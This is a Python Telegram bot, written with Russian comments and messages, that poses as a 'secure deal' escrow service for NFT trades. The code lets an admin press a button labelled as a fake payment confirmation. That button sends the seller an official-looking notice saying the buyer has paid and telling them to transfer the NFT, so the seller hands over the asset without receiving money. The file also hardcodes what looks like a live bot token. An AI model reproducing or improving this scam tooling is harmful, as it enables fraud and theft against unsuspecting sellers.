import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, KeyboardButton, ReplyKeyboardMarkup
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ================= НАСТРОЙКИ =================
BOT_TOKEN = "9185641906:AAHDMFMjBCRqN24BjGHW26DZW_J6FHyD1ec"
ADMIN_ID = 7532797597  
# ============================================

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# Храним сделку в оперативке
active_deals = {}

class CreateDeal(StatesGroup):
    bank_name = State()
    phone = State()
    amount = State()
    nft_link = State()

def main_menu():
    kb = [
        [KeyboardButton(text="🤝 Создать сделку")],
        [KeyboardButton(text="🛡 Админ-панель")] 
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

@dp.message(Command("start"))
async def cmd_start(message: Message):
    await message.answer(
        "Добро пожаловать 👋\n\n"
        "Это тестовый сервис безопасных сделок.\n"
        "Выберите действие:",
        reply_markup=main_menu()
    )

# --- 1. СОЗДАНИЕ СДЕЛКИ (ПРОДАВЕЦ) ---
@dp.message(F.text == "🤝 Создать сделку")
async def create_deal_start(message: Message, state: FSMContext):
    await state.set_state(CreateDeal.bank_name)
    await message.answer("🏦 <b>Шаг 1 из 4</b>\n\nВведите название вашего банка:", parse_mode="HTML")

@dp.message(CreateDeal.bank_name)
async def process_bank(message: Message, state: FSMContext):
    await state.update_data(bank_name=message.text)
    await state.set_state(CreateDeal.phone)
    await message.answer("📱 <b>Шаг 2 из 4</b>\n\nВведите ваш номер телефона:", parse_mode="HTML")

@dp.message(CreateDeal.phone)
async def process_phone(message: Message, state: FSMContext):
    await state.update_data(phone=message.text)
    await state.set_state(CreateDeal.amount)
    await message.answer("💰 <b>Шаг 3 из 4</b>\n\nВведите сумму сделки (например: 1000):", parse_mode="HTML")

@dp.message(CreateDeal.amount)
async def process_amount(message: Message, state: FSMContext):
    try:
        amount = int(message.text)
    except ValueError:
        return await message.answer("❌ Введите корректную сумму целым числом.")
    
    await state.update_data(amount=amount)
    await state.set_state(CreateDeal.nft_link)
    await message.answer("🖼 <b>Шаг 4 из 4</b>\n\nОтправьте ссылку на NFT (например: https://t.me/nft/PlushPepe-1):", parse_mode="HTML")

@dp.message(CreateDeal.nft_link)
async def process_nft(message: Message, state: FSMContext):
    data = await state.get_data()
    await state.clear()
    
    # Сохраняем сделку, ID сделки - это ID продавца
    deal_id = str(message.from_user.id)
    active_deals[deal_id] = {
        "seller_id": message.from_user.id,
        "seller_name": message.from_user.username or message.from_user.first_name,
        "buyer_id": None, # Покупатель пока неизвестен
        "bank_name": data["bank_name"],
        "phone": data["phone"],
        "amount": data["amount"],
        "nft_link": message.text,
        "status": "pending_admin_confirm"
    }
    
    await message.answer(
        f"✅ <b>Сделка создана!</b>\n\n"
        f"Сумма: {data['amount']} RUB\n"
        f"Товар: {message.text}\n\n"
        f"<i>Ожидайте подтверждения от системы безопасности...</i>",
        parse_mode="HTML"
    )
    
    # ⚠️ ОТПРАВЛЯЕМ ТЕБЕ (АДМИНУ) КАРТОЧКУ СДЕЛКИ
    admin_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Подтвердить оплату (ФЕЙК)", callback_data=f"admin_confirm_{deal_id}")]
    ])
    
    await bot.send_message(
        chat_id=ADMIN_ID,
        text=f"🛡 <b>АДМИН-ПАНЕЛЬ: НОВАЯ СДЕЛКА</b>\n\n"
             f"👤 Продавец: @{active_deals[deal_id]['seller_name']}\n"
             f"💰 Сумма: {data['amount']} RUB\n"
             f"🏦 Банк: {data['bank_name']}\n"
             f"📱 Тел: {data['phone']}\n"
             f"🖼 NFT: {message.text}\n\n"
             f"<b>Нажмите кнопку ниже, чтобы разослать фейковое подтверждение оплаты.</b>",
        parse_mode="HTML",
        reply_markup=admin_kb
    )

# --- 2. ПОКУПАТЕЛЬ ОТКРЫВАЕТ СДЕЛКУ (Через ссылку, которую дал продавец) ---
# В реальности продавец кидает ссылку на бота с параметром start, но для теста просто ловим диплинк
@dp.message(Command("start"), F.text.contains("deal_"))
async def start_deal_by_link(message: Message):
    try:
        deal_id = message.text.split("deal_")[1]
        deal = active_deals.get(deal_id)
        
        if not deal:
            return await message.answer("Сделка не найдена.")
            
        deal["buyer_id"] = message.from_user.id
        
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💸 Я оплатил", callback_data=f"pay_{deal_id}")]
        ])
        
        await message.answer(
            f"🛒 <b>Безопасная сделка</b>\n\n"
            f"Продавец: @{deal['seller_name']}\n"
            f"Сумма: {deal['amount']} RUB\n"
            f"Товар: {deal['nft_link']}\n\n"
            f"<b>Реквизиты для оплаты:</b>\n"
            f"Банк: {deal['bank_name']}\n"
            f"Телефон: <code>{deal['phone']}</code>\n\n"
            f"Переведите средства и нажмите кнопку ниже.",
            parse_mode="HTML",
            reply_markup=kb
        )
        
        # Уведомляем продавца, что покупатель пришел
        await bot.send_message(deal["seller_id"], f"🔔 Покупатель @{message.from_user.username} присоединился к сделке!")
        
    except Exception:
        await message.answer("Ошибка при открытии сделки.")

# --- 3. ТЫ (АДМИН) НАЖИМАЕШЬ ПОДТВЕРДИТЬ ---
@dp.callback_query(F.data.startswith("admin_confirm_"))
async def admin_confirm(call: CallbackQuery):
    # Строгая проверка, что кнопку нажал именно ты!
    if call.from_user.id != ADMIN_ID:
        return await call.answer("⛔ У вас нет прав!", show_alert=True)
    
    deal_id = call.data.split("_")[2]
    deal = active_deals.get(deal_id)
    
    deal["status"] = "paid"
    
    # Убираем кнопку из твоего чата
    await call.message.edit_text(f"✅ Вы разослали фейковое подтверждение по сделке с @{deal['seller_name']}.")
    
    # Солидный текст для продавца
    seller_text = (
        f"🛡 <b>СИСТЕМА БЕЗОПАСНЫХ СДЕЛОК</b>\n\n"
        f"✅ <b>Оплата по сделке успешно подтверждена!</b>\n\n"
        f"📄 <b>Детали:</b>\n"
        f"├ Сумма: <b>{deal['amount']} RUB</b>\n"
        f"└ Товар: {deal['nft_link']}\n\n"
        f"⚠️ <b>Инструкция для Продавца:</b>\n"
        f"Покупатель успешно перевел средства. <b>Передайте указанный NFT напрямую покупателю.</b>\n\n"
        f"<i>После передачи нажмите кнопку ниже.</i>"
    )
    
    seller_kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📦 Я передал NFT", callback_data=f"seller_done_{deal_id}")]
    ])
    
    # Отправляем продавцу
    try:
        await bot.send_message(deal["seller_id"], seller_text, parse_mode="HTML", reply_markup=seller_kb)
    except:
        pass
        
    # Отправляем покупателю (если он есть)
    if deal["buyer_id"]:
        try:
            await bot.send_message(deal["buyer_id"], f"✅ <b>Оплата подтверждена!</b>\nОжидайте получения NFT от продавца.", parse_mode="HTML")
        except:
            pass

# --- 4. ПРОДАВЕЦ ПОДТВЕРДИЛ ПЕРЕДАЧУ ---
@dp.callback_query(F.data.startswith("seller_done_"))
async def seller_done(call: CallbackQuery):
    deal_id = call.data.split("_")[2]
    deal = active_deals.get(deal_id)
    
    if deal:
        deal["status"] = "completed"
        await call.message.edit_text("✅ Вы подтвердили передачу. Сделка завершена.")
        
        if deal["buyer_id"]:
            try:
                await bot.send_message(deal["buyer_id"], f"🎉 Сделка успешно завершена! Проверьте ваш NFT.")
            except:
                pass

async def main():
    print("Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
